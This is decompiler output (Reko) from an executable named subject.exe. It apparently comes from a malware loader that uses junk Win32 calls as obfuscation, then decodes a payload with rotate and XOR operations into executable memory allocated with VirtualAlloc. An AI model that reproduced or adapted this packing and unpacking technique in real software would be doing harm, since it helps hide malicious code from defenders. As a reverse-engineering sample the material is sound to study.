// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004016CC: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ui32 edi_6 = edi | ebx;
	ui32 edx_18 = ~(edx + edi_6 - ecx);
	ui32 edx_24 = edx_18 ^ (eax | edx_18);
	ui32 esi_30 = (esi | 56002) - (ebx | 0xD3D7);
	ui32 ecx_31 = ecx - esi ^ edx_24;
	ui32 edi_35 = (edi_6 | 0xCBDE) & 54488;
	Eq_32 edx_41 = -edx_24;
	ui32 ecx_56 = (ecx_31 | 0xCC) - 0xCE;
	ui32 ebx_67 = ((ebx | 0xD3D7) + (ecx_31 | 0xCC) & ecx_56) + ~(GetDlgItem((struct HWND__ *) 0xC402FE84, edx_41) | (ecx_31 | 0xCC));
	ui32 esi_76 = ebx_67 ^ -(edi_35 ^ esi_30 - 0xC4C7);
	GetMessageW(null, (struct HWND__ *) 3319579331, edx_41 ^ 55514, ~0x05100A53);
	lstrcmpiW(null, null);
	ui32 esi_88 = esi_76 + ecx_56;
	GetCurrentProcess();
	Eq_32 ecx_97 = ecx_56 ^ esi_88;
	Eq_86 esi_101 = esi_88 - ebx_67;
	Eq_88 edx_102 = (ecx_56 ^ 0xDDCE) + 0xCBCE;
	VirtualAlloc(0xD5D1, 3111292250, 0xD7, 0x00D7D5D4);
	GetDlgItem((struct HWND__ *) 3763657058, ecx_97);
	PostMessageW((struct HWND__ *) ~0x72F18998, 0xD5, esi_101, edx_102);
	ReleaseDC((struct HWND__ *) 2299931637, (struct HDC__ *) 0xF0856C61);
	lstrlenW(null);
	Eq_128 edx_137 = edx_102 - 0xC4 - (ecx_97 - (0xD6 - ecx_97) < 0x00);
	GetLastError();
	lstrlenW(null);
	GetCommandLineA();
	GetModuleHandleW(null);
	Eq_151 esi_156 = ~esi_101;
	word32 edx_161 = (edx_137 + (ecx_97 & 0xDDDB) & 0xD1D7) - 55003;
	LocalAlloc(edx_161 ^ 0xC5, 3870407798);
	GetModuleHandleA(null);
	ui32 esi_194 = ~(esi_156 ^ (edx_161 ^ 0xC5));
	ui32 ebx_202 = (edx_161 ^ 0xC5) + 0xD8DD;
	FreeLibrary((struct HINSTANCE__ *) 2296986689);
	Eq_2 ebx_213 = ebx_202 - esi_194;
	GetSystemMetrics((word32) ebx_213 + 0x0000D1D2);
	Eq_2 esi_221 = ~esi_194;
	Eq_197 eax_226 = -QueryPerformanceCounter((LARGE_INTEGER *) 3367621806);
	Eq_64 edx_233 = (word32) esi_221 + ~3870407798;
	word32 edi_267 = SLICE(SEQ(ebx_213, CreateWindowExW(ebx_213, null, null, esi_221, 0xCCD0, ~0x31363430, eax_226, 3554594770, (struct HWND__ *) 0xDECD, (struct HMENU__ *) ~0x2F282332, (struct HINSTANCE__ *) ~0x443BA126, 0xD6) + 200) + 0xCBCE000000C8, word32, 32);
	SetTimer((struct HWND__ *) 3620340629, ~0x0430A0F8, edx_233, (void (*)(HWND, UINT, UINT_PTR, DWORD)) 0x8AD11386);
	Eq_249 edx_294 = ~edx_233;
	ui32 edi_298 = (-edi_267 & 0xC2CB) - edx_294;
	word32 ecx_313 = 0x8AD11386 - ebx_213;
	Eq_259 edx_315 = -edx_294;
	ui32 esi_337 = ~~0x0430A0F8;
	Eq_264 eax_329 = ebx_213 - ~edi_298;
	ui32 edx_340 = edx_315 - ebx_213 - (edx_315 == 0x00) & 0xC6 | esi_337;
	word32 ebx_341 = ~0x00;
	DWORD eax_352 = eax_329 + ((~ecx_313 - 0xCD) - eax_329);
	ui32 esi_365 = -esi_337 - edx_340;
	ui32 edx_383 = --(edx_340 ^ 0xCB);
	ui32 ebx_371 = -((word32) eax_352 + ebx_341);
	ui32 ecx_378 = ~(eax_352 & esi_365);
	ui32 esi_388 = esi_365 ^ edx_383;
	ui32 edx_391 = edx_383 & esi_388;
	Eq_2 eax_399 = UpdateLayeredWindow((struct HWND__ *) 4040436283, (struct HDC__ *) 3234322907, (POINT *) 3586576856, (SIZE *) 0xD6, (struct HDC__ *) 0xCB, (POINT *) 14144452, 3687568862, (BLENDFUNCTION *) 0x00CFC8C1, 0x00C0D3D2);
	if (eax_399 != 0x00)
		return eax_399;
	GetCurrentThreadId();
	uint32 ebx_413 = (word32) eax_399 + (ebx_371 | 0xDBD2) + (ecx_378 - 0x01);
	uint32 edx_416 = edx_391 - 0xCF - (ebx_413 < 0x00);
	do
	{
		uint64 ebx_edx_440 = SEQ(ebx_413, edx_416 - 54215);
		edx_416 = (word32) (ebx_edx_440 - 0xCEDB0000D3C7);
		ebx_413 = -SLICE(ebx_edx_440 - 0xCEDB0000D3C7, word32, 32);
		Eq_150 eax_455 = LoadLibraryA(null);
	} while (eax_455 != null);
	ui32 ebx_488 = -(ebx_413 - 0x01 & edx_416);
	word32 ebx_496 = ebx_488 + (eax_455 + 0xCF);
	word32 esi_510 = -(ecx_378 + (eax_455 + 0xCF));
	word32 eax_521 = PostMessageW((struct HWND__ *) 2339539282, GetCurrentProcessId() + 0xC0, 13293012, edx_416 - 0x01);
	GetCurrentProcessId();
	GetModuleFileNameA((struct HINSTANCE__ *) 3016361295, (CHAR *) 0xCF, -(esi_510 - 0xCD - (eax_521 < 57035) ^ 0xCF));
	ReleaseDC((struct HWND__ *) 0x8578F818, (struct HDC__ *) 2382498237);
	ui32 ecx_639 = ebx_496 - 0x01 ^ 55255;
	Eq_412 eax_658 = -SetTimer((struct HWND__ *) 0x99554C52, ~0x5A257153, ~0x312B3628, (void (*)(HWND, UINT, UINT_PTR, DWORD)) ~0x06EDE001);
	ui32 ebx_655 = (ecx_639 | 13293011) + 0xD5;
	ui32 esi_664 = eax_658 ^ 0xCBC5 | 0xC01E;
	uint32 eax_682 = (~(DestroyWindow((struct HWND__ *) ~0x00B00BE1) & 0xCF) ^ esi_664) - ecx_639;
	ui32 ebx_673 = ebx_655 | ecx_639;
	ui32 edi_685 = (~((eax_658 ^ 0xCBC5) - 0xC5CC) ^ 0xD0) - 0xDA - (eax_682 < 0x00);
	ui32 eax_688 = eax_682 | ecx_639;
	word32 ecx_696;
	struct Eq_458 * ebx_697;
	word32 esi_698;
	fn00402EE2(eax_688, ecx_639, 0xC3C9, ebx_673, esi_664 & 211, edi_685, out ecx_696, out ebx_697, out esi_698);
	ebx_697->ptr0004 = fs;
	(ui32 *) 4181850410 = (ui32 *) 4181850410 & fp - (struct Eq_485 *) 0x0114;
	byte * ecx_735 = (fp - (struct Eq_490 *) 252)->ptr0000;
	*ecx_735 = *ecx_735 & fp->b00F9;
}

// 00402EE2: Register ui32 fn00402EE2(Register ui32 eax, Register ui32 ecx, Register word32 edx, Register ui32 ebx, Register ui32 esi, Register ui32 edi, Register out ptr32 ecxOut, Register out ptr32 ebxOut, Register out ptr32 esiOut)
ui32 fn00402EE2(ui32 eax, ui32 ecx, word32 edx, ui32 ebx, ui32 esi, ui32 edi, ptr32 & ecxOut, ptr32 & ebxOut, ptr32 & esiOut)
{
	GetCommandLineW();
	GetCurrentProcess();
	LocalAlloc(0xC2C1, 0xA12F1DAC);
	Eq_95 eax_279 = VirtualAlloc(0x00, 27247, 0x3000, 0x40);
	Eq_95 esi_342 = null;
	word32 eax_377 = eax_279 + 3166 | 0xD9;
	byte * ecx_392 = (word32) (SEQ(4294911924 - (eax_377 & 0xD3D9), eax_279) - 3166);
	Eq_536 edx_417 = 0x1460;
	do
	{
		byte bh_473 = __rol(*esi_342, 22);
		word32 ebx_474 = DPB(0xDA, bh_473, 8);
		ui8 bh_497 = -(bh_473 ^ 0x77);
		word32 ebx_498 = DPB(ebx_474, bh_497, 8);
		*ecx_392 = bh_497;
		esi_342 = esi_342 + 0x01;
		*esiOut = esi_342;
		ecx_392 = ecx_392 + 0x01;
		edx_417 = edx_417 - 0x01;
	} while (edx_417 != 0x00);
	Eq_569 ebx_587 = -ebx_498;
	word32 ebx_590 = ebx_587 + edx_417;
	Eq_573 eax_592 = (ebx_587 == 0x00) - ((edx_417 - 0x9130CD66) - ebx_587);
	ui32 ecx_594 = ecx_392 | ebx_590;
	*ecxOut = ecx_594;
	word32 ebx_603;
	*ebxOut = (ebx_590 ^ 222) + ecx_594;
	return eax_592 - (ebx_590 ^ 222) ^ 220;
}

